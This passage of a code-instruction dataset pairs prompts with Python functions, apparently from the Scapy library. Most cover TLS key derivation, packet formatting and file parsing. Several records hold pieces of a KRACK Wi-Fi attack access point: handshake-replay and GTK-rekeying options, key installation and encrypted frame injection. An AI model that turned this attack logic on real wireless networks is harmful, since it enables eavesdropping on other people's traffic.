int(num)\n                fmt = fmt[i + 1:]\n            except Exception:\n                raise Scapy_Exception(\"Bad format string [%%%s%s]\" % (fmt[:25], fmt[25:] and \"...\"))  # noqa: E501\n            else:\n                if fld == \"time\":\n                    val = time.strftime(\"%H:%M:%S.%%06i\", time.localtime(self.time)) % int((self.time - int(self.time)) * 1000000)  # noqa: E501\n                elif cls == self.__class__.__name__ and hasattr(self, fld):\n                    if num > 1:\n                        val = self.payload.sprintf(\"%%%s,%s:%s.%s%%\" % (f, cls, num - 1, fld), relax)  # noqa: E501\n                        f = \"s\"\n                    elif f[-1] == \"r\":  # Raw field value\n                        val = getattr(self, fld)\n                        f = f[:-1]\n                        if not f:\n                            f = \"s\"\n                    else:\n                        val = getattr(self, fld)\n                        if fld in self.fieldtype:\n                            val = self.fieldtype[fld].i2repr(self, val)\n                else:\n                    val = self.payload.sprintf(\"%%%s%%\" % sfclsfld, relax)\n                    f = \"s\"\n                s += (\"%\" + f) % val\n\n        s += fmt\n        return s", "response": "Return a string that can be used as a sprintf statement in a log file."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn a string representing the command you have to type to obtain the same packet", "response": "def command(self):\n        \"\"\"\n        Returns a string representing the command you have to type to\n        obtain the same packet\n        \"\"\"\n        f = []\n        for fn, fv in six.iteritems(self.fields):\n            fld = self.get_field(fn)\n            if isinstance(fv, (list, dict, set)) and len(fv) == 0:\n                continue\n            if isinstance(fv, Packet):\n                fv = fv.command()\n            elif fld.islist and fld.holds_packets and isinstance(fv, list):\n                fv = \"[%s]\" % \",\".join(map(Packet.command, fv))\n            elif isinstance(fld, FlagsField):\n                fv = int(fv)\n            else:\n                fv = repr(fv)\n            f.append(\"%s=%s\" % (fn, fv))\n        c = \"%s(%s)\" % (self.__class__.__name__, \", \".join(f))\n        pc = self.payload.command()\n        if pc:\n            c += \"/\" + pc\n        return c"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ninitializes the TLS session.", "response": "def INIT_TLS_SESSION(self):\n        \"\"\"\n        XXX We should offer the right key according to the client's suites. For\n        now server_rsa_key is only used for RSAkx, but we should try to replace\n        every server_key with both server_rsa_key and server_ecdsa_key.\n        \"\"\"\n        self.cur_session = tlsSession(connection_end=\"server\")\n        self.cur_session.server_certs = [self.mycert]\n        self.cur_session.server_key = self.mykey\n        if isinstance(self.mykey, PrivKeyRSA):\n            self.cur_session.server_rsa_key = self.mykey\n        # elif isinstance(self.mykey, PrivKeyECDSA):\n        #    self.cur_session.server_ecdsa_key = self.mykey\n        raise self.WAITING_CLIENTFLIGHT1()"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef should_check_ciphersuites(self):\n        if isinstance(self.mykey, PrivKeyRSA):\n            kx = \"RSA\"\n        elif isinstance(self.mykey, PrivKeyECDSA):\n            kx = \"ECDSA\"\n        if get_usable_ciphersuites(self.cur_pkt.ciphers, kx):\n            return\n        raise self.NO_USABLE_CIPHERSUITE()", "response": "Check if cipher suites are usable."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef should_add_ServerHello(self):\n        if isinstance(self.mykey, PrivKeyRSA):\n            kx = \"RSA\"\n        elif isinstance(self.mykey, PrivKeyECDSA):\n            kx = \"ECDSA\"\n        usable_suites = get_usable_ciphersuites(self.cur_pkt.ciphers, kx)\n        c = usable_suites[0]\n        if self.preferred_ciphersuite in usable_suites:\n            c = self.preferred_ciphersuite\n        self.add_msg(TLSServerHello(cipher=c))\n        raise self.ADDED_SERVERHELLO()", "response": "Add a server hello message to the message queue."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nparsing the arguments for the KrackAP object.", "response": "def parse_args(self, ap_mac, ssid, passphrase,\n                   channel=None,\n                   # KRACK attack options\n                   double_3handshake=True,\n                   encrypt_3handshake=True,\n                   wait_3handshake=0,\n                   double_gtk_refresh=True,\n                   arp_target_ip=None,\n                   arp_source_ip=None,\n                   wait_gtk=10,\n                   **kwargs):\n        \"\"\"\n        Mandatory arguments:\n        @iface: interface to use (must be in monitor mode)\n        @ap_mac: AP's MAC\n        @ssid: AP's SSID\n        @passphrase: AP's Passphrase (min 8 char.)\n\n        Optional arguments:\n        @channel: used by the interface. Default 6, autodetected on windows\n\n        Krack attacks options:\n\n         - Msg 3/4 handshake replay:\n        double_3handshake: double the 3/4 handshake message\n        encrypt_3handshake: encrypt the second 3/4 handshake message\n        wait_3handshake: time to wait (in sec.) before sending the second 3/4\n         - double GTK rekeying:\n        double_gtk_refresh: double the 1/2 GTK rekeying message\n        wait_gtk: time to wait (in sec.) before sending the GTK rekeying\n        arp_target_ip: Client IP to use in ARP req. (to detect attack success)\n                       If None, use a DHCP server\n        arp_source_ip: Server IP to use in ARP req. (to detect attack success)\n                       If None, use the DHCP server gateway address\n        \"\"\"\n        super(KrackAP, self).parse_args(**kwargs)\n\n        # Main AP options\n        self.mac = ap_mac\n        self.ssid = ssid\n        self.passphrase = passphrase\n        if channel is None:\n            if WINDOWS:\n                try:\n                    channel = kwargs.get(\"iface\", conf.iface).channel()\n                except (Scapy_Exception, AttributeError):\n                    channel = 6\n            else:\n                channel = 6\n        self.channel = channel\n\n        # Internal structures\n        self.last_iv = None\n        self.client = None\n        self.seq_num = count()\n        self.replay_counter = count()\n        self.time_handshake_end = None\n        self.dhcp_server = DHCPOverWPA(send_func=self.send_ether_over_wpa,\n                                       pool=Net(\"192.168.42.128/25\"),\n                                       network=\"192.168.42.0/24\",\n                                       gw=\"192.168.42.1\")\n        self.arp_sent = []\n        self.arp_to_send = 0\n        self.arp_retry = 0\n\n        # Bit 0: 3way handshake sent\n        # Bit 1: GTK rekeying sent\n        # Bit 2: ARP response obtained\n        self.krack_state = 0\n\n        # Krack options\n        self.double_3handshake = double_3handshake\n        self.encrypt_3handshake = encrypt_3handshake\n        self.wait_3handshake = wait_3handshake\n        self.double_gtk_refresh = double_gtk_refresh\n        self.arp_target_ip = arp_target_ip\n        if arp_source_ip is None:\n            # Use the DHCP server Gateway address\n            arp_source_ip = self.dhcp_server.gw\n        self.arp_source_ip = arp_source_ip\n        self.wait_gtk = wait_gtk\n\n        # May take several seconds\n        self.install_PMK()"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef install_PMK(self):\n        self.pmk = PBKDF2HMAC(\n            algorithm=hashes.SHA1(),\n            length=32,\n            salt=self.ssid.encode(),\n            iterations=4096,\n            backend=default_backend(),\n        ).derive(self.passphrase.encode())", "response": "Compute and install the PMK"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nuse the client nonce to compute and install the unicast keys for the current client.", "response": "def install_unicast_keys(self, client_nonce):\n        \"\"\"Use the client nonce @client_nonce to compute and install\n        PTK, KCK, KEK, TK, MIC (AP -> STA), MIC (STA -> AP)\n        \"\"\"\n        pmk = self.pmk\n        anonce = self.anonce\n        snonce = client_nonce\n        amac = mac2str(self.mac)\n        smac = mac2str(self.client)\n\n        # Compute PTK\n        self.ptk = customPRF512(pmk, amac, smac, anonce, snonce)\n\n        # Extract derivated keys\n        self.kck = self.ptk[:16]\n        self.kek = self.ptk[16:32]\n        self.tk = self.ptk[32:48]\n        self.mic_ap_to_sta = self.ptk[48:56]\n        self.mic_sta_to_ap = self.ptk[56:64]\n\n        # Reset IV\n        self.client_iv = count()"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef install_GTK(self):\n\n        # Compute GTK\n        self.gtk_full = self.gen_nonce(32)\n        self.gtk = self.gtk_full[:16]\n\n        # Extract derivated keys\n        self.mic_ap_to_group = self.gtk_full[16:24]\n\n        # Reset IV\n        self.group_iv = count()", "response": "Compute a new GTK and install it alongs\n        MIC"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef build_ap_info_pkt(self, layer_cls, dest):\n        return RadioTap() \\\n            / Dot11(addr1=dest, addr2=self.mac, addr3=self.mac) \\\n            / layer_cls(timestamp=0, beacon_interval=100,\n                        cap='ESS+privacy') \\\n            / Dot11Elt(ID=\"SSID\", info=self.ssid) \\\n            / Dot11EltRates(rates=[130, 132, 139, 150, 12, 18, 24, 36]) \\\n            / Dot11Elt(ID=\"DSset\", info=chb(self.channel)) \\\n            / Dot11EltRSN(group_cipher_suite=RSNCipherSuite(cipher=0x2),\n                          pairwise_cipher_suites=[RSNCipherSuite(cipher=0x2)],\n                          akm_suites=[AKMSuite(suite=0x2)])", "response": "Build a packet with info describing the current AP."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nbuilds the Key Data Encapsulation for GTK.", "response": "def build_GTK_KDE(self):\n        \"\"\"Build the Key Data Encapsulation for GTK\n        KeyID: 0\n        Ref: 802.11i p81\n        \"\"\"\n        return b''.join([\n            b'\\xdd',  # Type KDE\n            chb(len(self.gtk_full) + 6),\n            b'\\x00\\x0f\\xac',  # OUI\n            b'\\x01',  # GTK KDE\n            b'\\x00\\x00',  # KeyID - Tx - Reserved x2\n            self.gtk_full,\n        ])"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef send_wpa_enc(self, data, iv, seqnum, dest, mic_key,\n                     key_idx=0, additionnal_flag=[\"from-DS\"],\n                     encrypt_key=None):\n        \"\"\"Send an encrypted packet with content @data, using IV @iv,\n        sequence number @seqnum, MIC key @mic_key\n        \"\"\"\n\n        if encrypt_key is None:\n            encrypt_key = self.tk\n\n        rep = RadioTap()\n        rep /= Dot11(\n            addr1=dest,\n            addr2=self.mac,\n            addr3=self.mac,\n            FCfield=\"+\".join(['protected'] + additionnal_flag),\n            SC=(next(self.seq_num) << 4),\n            subtype=0,\n            type=\"Data\",\n        )\n\n        # Assume packet is send by our AP -> use self.mac as source\n\n        # Encapsule in TKIP with MIC Michael and ICV\n        data_to_enc = build_MIC_ICV(raw(data), mic_key, self.mac, dest)\n\n        # Header TKIP + payload\n        rep /= Raw(build_TKIP_payload(data_to_enc, iv, self.mac, encrypt_key))\n\n        self.send(rep)\n        return rep", "response": "Send an encrypted packet with content data using IV seqnum MIC key mic_key and key_idx."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nsends an Ethernet packet over the WPA channel.", "response": "def send_ether_over_wpa(self, pkt, **kwargs):\n        \"\"\"Send an Ethernet packet using the WPA channel\n        Extra arguments will be ignored, and are just left for compatibility\n        \"\"\"\n\n        payload = LLC() / SNAP() / pkt[Ether].payload\n        dest = pkt.dst\n        if dest == \"ff:ff:ff:ff:ff:ff\":\n            self.send_wpa_to_group(payload, dest)\n        else:\n            assert dest == self.client\n            self.send_wpa_to_client(payload)"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nraises state on the next packet.", "response": "def raise_on_packet(self, pkt_cls, state, get_next_msg=True):\n        \"\"\"\n        If the next message to be processed has type 'pkt_cls', raise 'state'.\n        If there is no message waiting to be processed, we try to get one with\n        the default 'get_next_msg' parameters.\n        \"\"\"\n        # Maybe we already parsed the expected packet, maybe not.\n        if get_next_msg:\n            self.get_next_msg()\n        if (not self.buffer_in or\n                not isinstance(self.buffer_in[0], pkt_cls)):\n            return\n        self.cur_pkt = self.buffer_in[0]\n        self.buffer_in = self.buffer_in[1:]\n        raise state()"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef add_record(self, is_sslv2=None, is_tls13=None):\n        if is_sslv2 is None and is_tls13 is None:\n            v = (self.cur_session.tls_version or\n                 self.cur_session.advertised_tls_version)\n            if v in [0x0200, 0x0002]:\n                is_sslv2 = True\n            elif v >= 0x0304:\n                is_tls13 = True\n        if is_sslv2:\n            self.buffer_out.append(SSLv2(tls_session=self.cur_session))\n        elif is_tls13:\n            self.buffer_out.append(TLS13(tls_session=self.cur_session))\n        else:\n            self.buffer_out.append(TLS(tls_session=self.cur_session))", "response": "Add a new TLS or SSLv2 or TLS 1. 3 record to the packets buffered out."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nadding a TLS message to the message buffer.", "response": "def add_msg(self, pkt):\n        \"\"\"\n        Add a TLS message (e.g. TLSClientHello or TLSApplicationData)\n        inside the latest record to be sent through the socket.\n        We believe a good automaton should not use the first test.\n        \"\"\"\n        if not self.buffer_out:\n            self.add_record()\n        r = self.buffer_out[-1]\n        if isinstance(r, TLS13):\n            self.buffer_out[-1].inner.msg.append(pkt)\n        else:\n            self.buffer_out[-1].msg.append(pkt)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef flush_records(self):\n        s = b\"\".join(p.raw_stateful() for p in self.buffer_out)\n        self.socket.send(s)\n        self.buffer_out = []", "response": "Send all buffered records and update the session accordingly."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef util_srcpanid_present(pkt):\n    '''A source PAN ID is included if and only if both src addr mode != 0 and PAN ID Compression in FCF == 0'''  # noqa: E501\n    if (pkt.underlayer.getfieldval(\"fcf_srcaddrmode\") != 0) and (pkt.underlayer.getfieldval(\"fcf_panidcompress\") == 0):  # noqa: E501\n        return True\n    else:\n        return False", "response": "A source PAN ID is included if and only if both src addr mode and PAN ID Compression in FCF == 0"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nconverting internal value to a nice representation", "response": "def i2repr(self, pkt, x):\n        \"\"\"Convert internal value to a nice representation\"\"\"\n        if len(hex(self.i2m(pkt, x))) < 7:  # short address\n            return hex(self.i2m(pkt, x))\n        else:  # long address\n            x = \"%016x\" % self.i2m(pkt, x)\n            return \":\".join([\"%s%s\" % (x[i], x[i + 1]) for i in range(0, len(x), 2)])"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nadd an internal value to a string", "response": "def addfield(self, pkt, s, val):\n        \"\"\"Add an internal value to a string\"\"\"\n        if self.adjust(pkt, self.length_of) == 2:\n            return s + struct.pack(self.fmt[0] + \"H\", val)\n        elif self.adjust(pkt, self.length_of) == 8:\n            return s + struct.pack(self.fmt[0] + \"Q\", val)\n        else:\n            return s"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nprovide the implementation of P_hash function defined in section 5 of RFC 4346 (and section 5 of RFC 5246). Two parameters have been added (hm and req_len): - secret : the key to be used. If RFC 4868 is to be believed, the length must match hm.key_len. Actually, python hmac takes care of formatting every key. - seed : the seed to be used. - req_len : the length of data to be generated by iterating the specific HMAC function (hm). This prevents multiple calls to the function. - hm : the hmac function class to use for iteration (either Hmac_MD5 or Hmac_SHA1 in TLS <= 1.1 or Hmac_SHA256 or Hmac_SHA384 in TLS 1.2)", "response": "def _tls_P_hash(secret, seed, req_len, hm):\n    \"\"\"\n    Provides the implementation of P_hash function defined in\n    section 5 of RFC 4346 (and section 5 of RFC 5246). Two\n    parameters have been added (hm and req_len):\n\n    - secret : the key to be used. If RFC 4868 is to be believed,\n               the length must match hm.key_len. Actually,\n               python hmac takes care of formatting every key.\n    - seed : the seed to be used.\n    - req_len : the length of data to be generated by iterating\n               the specific HMAC function (hm). This prevents\n               multiple calls to the function.\n    - hm : the hmac function class to use for iteration (either\n           Hmac_MD5 or Hmac_SHA1 in TLS <= 1.1 or\n           Hmac_SHA256 or Hmac_SHA384 in TLS 1.2)\n    \"\"\"\n    hash_len = hm.hash_alg.hash_len\n    n = (req_len + hash_len - 1) // hash_len\n    seed = bytes_encode(seed)\n\n    res = b\"\"\n    a = hm(secret).digest(seed)  # A(1)\n\n    while n > 0:\n        res += hm(secret).digest(a + seed)\n        a = hm(secret).digest(a)\n        n -= 1\n\n    return res[:req_len]"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _ssl_PRF(secret, seed, req_len):\n    if req_len > 416:\n        warning(\"_ssl_PRF() is not expected to provide more than 416 bytes\")\n        return \"\"\n\n    d = [b\"A\", b\"B\", b\"C\", b\"D\", b\"E\", b\"F\", b\"G\", b\"H\", b\"I\", b\"J\", b\"K\", b\"L\",  # noqa: E501\n         b\"M\", b\"N\", b\"O\", b\"P\", b\"Q\", b\"R\", b\"S\", b\"T\", b\"U\", b\"V\", b\"W\", b\"X\",  # noqa: E501\n         b\"Y\", b\"Z\"]\n    res = b\"\"\n    hash_sha1 = _tls_hash_algs[\"SHA\"]()\n    hash_md5 = _tls_hash_algs[\"MD5\"]()\n    rounds = (req_len + hash_md5.hash_len - 1) // hash_md5.hash_len\n\n    for i in range(rounds):\n        label = d[i] * (i + 1)\n        tmp = hash_sha1.digest(label + secret + seed)\n        res += hash_md5.digest(secret + tmp)\n\n    return res[:req_len]", "response": "Returns the SSLv3 PRF function for the given secret and seed."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _tls_PRF(secret, label, seed, req_len):\n    tmp_len = (len(secret) + 1) // 2\n    S1 = secret[:tmp_len]\n    S2 = secret[-tmp_len:]\n\n    a1 = _tls_P_MD5(S1, label + seed, req_len)\n    a2 = _tls_P_SHA1(S2, label + seed, req_len)\n\n    return strxor(a1, a2)", "response": "Returns the PRF function for the given secret label and seed."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning the implementation of TLS 1. 2 PRF function as", "response": "def _tls12_SHA256PRF(secret, label, seed, req_len):\n    \"\"\"\n    Provides the implementation of TLS 1.2 PRF function as\n    defined in section 5 of RFC 5246:\n\n    PRF(secret, label, seed) = P_SHA256(secret, label + seed)\n\n    Parameters are:\n\n    - secret: the secret used by the HMAC in the 2 expansion\n              functions (S1 and S2 are the halves of this secret).\n    - label: specific label as defined in various sections of the RFC\n             depending on the use of the generated PRF keystream\n    - seed: the seed used by the expansion functions.\n    - req_len: amount of keystream to be generated\n    \"\"\"\n    return _tls_P_SHA256(secret, label + seed, req_len)"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ncomputes the master secret from the pre_master_secret client_random and server_random.", "response": "def compute_master_secret(self, pre_master_secret,\n                              client_random, server_random):\n        \"\"\"\n        Return the 48-byte master_secret, computed from pre_master_secret,\n        client_random and server_random. See RFC 5246, section 6.3.\n        \"\"\"\n        seed = client_random + server_random\n        if self.tls_version < 0x0300:\n            return None\n        elif self.tls_version == 0x0300:\n            return self.prf(pre_master_secret, seed, 48)\n        else:\n            return self.prf(pre_master_secret, b\"master secret\", seed, 48)"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nderives a key_block from a master_secret.", "response": "def derive_key_block(self, master_secret, server_random,\n                         client_random, req_len):\n        \"\"\"\n        Perform the derivation of master_secret into a key_block of req_len\n        requested length. See RFC 5246, section 6.3.\n        \"\"\"\n        seed = server_random + client_random\n        if self.tls_version <= 0x0300:\n            return self.prf(master_secret, seed, req_len)\n        else:\n            return self.prf(master_secret, b\"key expansion\", seed, req_len)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef compute_verify_data(self, con_end, read_or_write,\n                            handshake_msg, master_secret):\n        \"\"\"\n        Return verify_data based on handshake messages, connection end,\n        master secret, and read_or_write position. See RFC 5246, section 7.4.9.\n\n        Every TLS 1.2 cipher suite has a verify_data of length 12. Note also:\n        \"This PRF with the SHA-256 hash function is used for all cipher\n         suites defined in this document and in TLS documents published\n         prior to this document when TLS 1.2 is negotiated.\"\n        Cipher suites using SHA-384 were defined later on.\n        \"\"\"\n        if self.tls_version < 0x0300:\n            return None\n        elif self.tls_version == 0x0300:\n\n            if read_or_write == \"write\":\n                d = {\"client\": b\"CLNT\", \"server\": b\"SRVR\"}\n            else:\n                d = {\"client\": b\"SRVR\", \"server\": b\"CLNT\"}\n            label = d[con_end]\n\n            sslv3_md5_pad1 = b\"\\x36\" * 48\n            sslv3_md5_pad2 = b\"\\x5c\" * 48\n            sslv3_sha1_pad1 = b\"\\x36\" * 40\n            sslv3_sha1_pad2 = b\"\\x5c\" * 40\n\n            md5 = _tls_hash_algs[\"MD5\"]()\n            sha1 = _tls_hash_algs[\"SHA\"]()\n\n            md5_hash = md5.digest(master_secret + sslv3_md5_pad2 +\n                                  md5.digest(handshake_msg + label +\n                                             master_secret + sslv3_md5_pad1))\n            sha1_hash = sha1.digest(master_secret + sslv3_sha1_pad2 +\n                                    sha1.digest(handshake_msg + label +\n                                                master_secret + sslv3_sha1_pad1))  # noqa: E501\n            verify_data = md5_hash + sha1_hash\n\n        else:\n\n            if read_or_write == \"write\":\n                d = {\"client\": \"client\", \"server\": \"server\"}\n            else:\n                d = {\"client\": \"server\", \"server\": \"client\"}\n            label = (\"%s finished\" % d[con_end]).encode()\n\n            if self.tls_version <= 0x0302:\n                s1 = _tls_hash_algs[\"MD5\"]().digest(handshake_msg)\n                s2 = _tls_hash_algs[\"SHA\"]().digest(handshake_msg)\n                verify_data = self.prf(master_secret, label, s1 + s2, 12)\n            else:\n                if self.hash_name in [\"MD5\", \"SHA\"]:\n                    h = _tls_hash_algs[\"SHA256\"]()\n                else:\n                    h = _tls_hash_algs[self.hash_name]()\n                s = h.digest(handshake_msg)\n                verify_data = self.prf(master_secret, label, s, 12)\n\n        return verify_data", "response": "Compute verify_data based on handshake messages master_secret and read_or_write."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef postprocess_key_for_export(self, key, client_random, server_random,\n                                   con_end, read_or_write, req_len):\n        \"\"\"\n        Postprocess cipher key for EXPORT ciphersuite, i.e. weakens it.\n        An export key generation example is given in section 6.3.1 of RFC 2246.\n        See also page 86 of EKR's book.\n        \"\"\"\n        s = con_end + read_or_write\n        s = (s == \"clientwrite\" or s == \"serverread\")\n\n        if self.tls_version < 0x0300:\n            return None\n        elif self.tls_version == 0x0300:\n            if s:\n                tbh = key + client_random + server_random\n            else:\n                tbh = key + server_random + client_random\n            export_key = _tls_hash_algs[\"MD5\"]().digest(tbh)[:req_len]\n        else:\n            if s:\n                tag = b\"client write key\"\n            else:\n                tag = b\"server write key\"\n            export_key = self.prf(key,\n                                  tag,\n                                  client_random + server_random,\n                                  req_len)\n        return export_key", "response": "Postprocess cipher key for EXPORT cipher suite."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ngenerates an export IV for the specified ciphersuite.", "response": "def generate_iv_for_export(self, client_random, server_random,\n                               con_end, read_or_write, req_len):\n        \"\"\"\n        Generate IV for EXPORT ciphersuite, i.e. weakens it.\n        An export IV generation example is given in section 6.3.1 of RFC 2246.\n        See also page 86 of EKR's book.\n        \"\"\"\n        s = con_end + read_or_write\n        s = (s == \"clientwrite\" or s == \"serverread\")\n\n        if self.tls_version < 0x0300:\n            return None\n        elif self.tls_version == 0x0300:\n            if s:\n                tbh = client_random + server_random\n            else:\n                tbh = server_random + client_random\n            iv = _tls_hash_algs[\"MD5\"]().digest(tbh)[:req_len]\n        else:\n            iv_block = self.prf(\"\",\n                                b\"IV block\",\n                                client_random + server_random,\n                                2 * req_len)\n            if s:\n                iv = iv_block[:req_len]\n            else:\n                iv = iv_block[req_len:]\n        return iv"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef load_protocols(filename, _integer_base=10):\n    spaces = re.compile(b\"[ \\t]+|\\n\")\n    dct = DADict(_name=filename)\n    try:\n        with open(filename, \"rb\") as fdesc:\n            for line in fdesc:\n                try:\n                    shrp = line.find(b\"#\")\n                    if shrp >= 0:\n                        line = line[:shrp]\n                    line = line.strip()\n                    if not line:\n                        continue\n                    lt = tuple(re.split(spaces, line))\n                    if len(lt) < 2 or not lt[0]:\n                        continue\n                    dct[lt[0]] = int(lt[1], _integer_base)\n                except Exception as e:\n                    log_loading.info(\n                        \"Couldn't parse file [%s]: line [%r] (%s)\",\n                        filename,\n                        line,\n                        e,\n                    )\n    except IOError:\n        log_loading.info(\"Can't open %s file\", filename)\n    return dct", "response": "Parse / etc / protocols and return values as a dictionary."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef load_manuf(filename):\n    manufdb = ManufDA(_name=filename)\n    with open(filename, \"rb\") as fdesc:\n        for line in fdesc:\n            try:\n                line = line.strip()\n                if not line or line.startswith(b\"#\"):\n                    continue\n                parts = line.split(None, 2)\n                oui, shrt = parts[:2]\n                lng = parts[2].lstrip(b\"#\").strip() if len(parts) > 2 else \"\"\n                lng = lng or shrt\n                manufdb[oui] = plain_str(shrt), plain_str(lng)\n            except Exception:\n                log_loading.warning(\"Couldn't parse one line from [%s] [%r]\",\n                                    filename, line, exc_info=True)\n    return manufdb", "response": "Load the manuf file from Wireshark."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nfinding the OUI name matching to a MAC", "response": "def lookup(self, mac):\n        \"\"\"Find OUI name matching to a MAC\"\"\"\n        oui = \":\".join(mac.split(\":\")[:3]).upper()\n        return self[oui]"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning a dict of all MACs registered to a OUI.", "response": "def reverse_lookup(self, name, case_sensitive=False):\n        \"\"\"Find all MACs registered to a OUI\n        params:\n         - name: the OUI name\n         - case_sensitive: default to False\n        returns: a dict of mac:tuples (Name, Extended Name)\n        \"\"\"\n        if case_sensitive:\n            filtr = lambda x, l: any(x == z for z in l)\n        else:\n            name = name.lower()\n            filtr = lambda x, l: any(x == z.lower() for z in l)\n        return {k: v for k, v in six.iteritems(self.__dict__)\n                if filtr(name, v)}"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef answers(self, other):\n        if not hasattr(other, \"ctr\"):\n            return 0\n        if self.ctr != other.ctr:\n            return 0\n        if not hasattr(other, \"cmd\"):\n            return 0\n\n        new_pl_cls = self.get_dto_cls(other.cmd)\n        if self.payload_cls != new_pl_cls and \\\n                self.payload_cls == DEFAULT_DTO:\n            data = bytes(self.load)\n            self.remove_payload()\n            self.add_payload(new_pl_cls(data))\n            self.payload_cls = new_pl_cls\n        return 1", "response": "This function is used to determine the class of the payload of another DTO packet."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nread the version from git describe.", "response": "def _version_from_git_describe():\n    \"\"\"\n    Read the version from ``git describe``. It returns the latest tag with an\n    optional suffix if the current directory is not exactly on the tag.\n\n    Example::\n\n        $ git describe --always\n        v2.3.2-346-g164a52c075c8\n\n    The tag prefix (``v``) and the git commit sha1 (``-g164a52c075c8``) are\n    removed if present.\n\n    If the current directory is not exactly on the tag, a ``.devN`` suffix is\n    appended where N is the number of commits made after the last tag.\n\n    Example::\n\n        >>> _version_from_git_describe()\n        '2.3.2.dev346'\n    \"\"\"\n    if not os.path.isdir(os.path.join(os.path.dirname(_SCAPY_PKG_DIR), '.git')):  # noqa: E501\n        raise ValueError('not in scapy git repo')\n\n    process = subprocess.Popen(['git', 'describe', '--always'],\n                               cwd=_SCAPY_PKG_DIR,\n                               stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n\n    out, err = process.communicate()\n\n    if process.returncode == 0:\n        tag = out.decode().strip()\n        match = re.match('^v?(.+?)-(\\\\d+)-g[a-f0-9]+$', tag)\n        if match:\n            # remove the 'v' prefix and add a '.devN' suffix\n            return '%s.dev%s' % (match.group(1), match.group(2))\n        else:\n            # just remove the 'v' prefix\n            return re.sub('^v', '', tag)\n    else:\n        raise subprocess.CalledProcessError(process.returncode, err)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning a string representation of the object.", "response": "def _show_or_dump(self, dump=False, indent=3,\n                      lvl=\"\", label_lvl=\"\", first_call=True):\n        \"\"\" Reproduced from packet.py \"\"\"\n        ct = AnsiColorTheme() if dump else conf.color_theme\n        s = \"%s%s %s %s \\n\" % (label_lvl, ct.punct(\"###[\"),\n                               ct.layer_name(self.name), ct.punct(\"]###\"))\n        for f in self.fields_desc[:-1]:\n            ncol = ct.field_name\n            vcol = ct.field_value\n            fvalue = self.getfieldval(f.name)\n            begn = \"%s  %-10s%s \" % (label_lvl + lvl, ncol(f.name),\n                                     ct.punct(\"=\"),)\n            reprval = f.i2repr(self, fvalue)\n            if isinstance(reprval, str):\n                reprval = reprval.replace(\"\\n\", \"\\n\" + \" \" * (len(label_lvl) +\n                                                              len(lvl) +\n                                                              len(f.name) +\n                                                              4))\n            s += \"%s%s\\n\" % (begn, vcol(reprval))\n        f = self.fields_desc[-1]\n        ncol = ct.field_name\n        vcol = ct.field_value\n        fvalue = self.getfieldval(f.name)\n        begn = \"%s  %-10s%s \" % (label_lvl + lvl, ncol(f.name), ct.punct(\"=\"),)\n        reprval = f.i2repr(self, fvalue)\n        if isinstance(reprval, str):\n            reprval = reprval.replace(\"\\n\", \"\\n\" + \" \" * (len(label_lvl) +\n                                                          len(lvl) +\n                                                          len(f.name) +\n                                                          4))\n        s += \"%s%s\\n\" % (begn, vcol(reprval))\n        if self.payload:\n            s += self.payload._show_or_dump(dump=dump, indent=indent,\n                                            lvl=lvl + (\" \" * indent * self.show_indent),  # noqa: E501\n                                            label_lvl=label_lvl, first_call=False)  # noqa: E501\n\n        if first_call and not dump:\n            print(s)\n        else:\n            return s"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef getfield(self, pkt, s):\n        ext = pkt.get_field(self.length_of)\n        tmp_len = ext.length_from(pkt)\n        if tmp_len is None or tmp_len <= 0:\n            v = pkt.tls_session.tls_version\n            if v is None or v < 0x0304:\n                return s, None\n        return super(_ExtensionsLenField, self).getfield(pkt, s)", "response": "Return the length of the record from the extension field."}
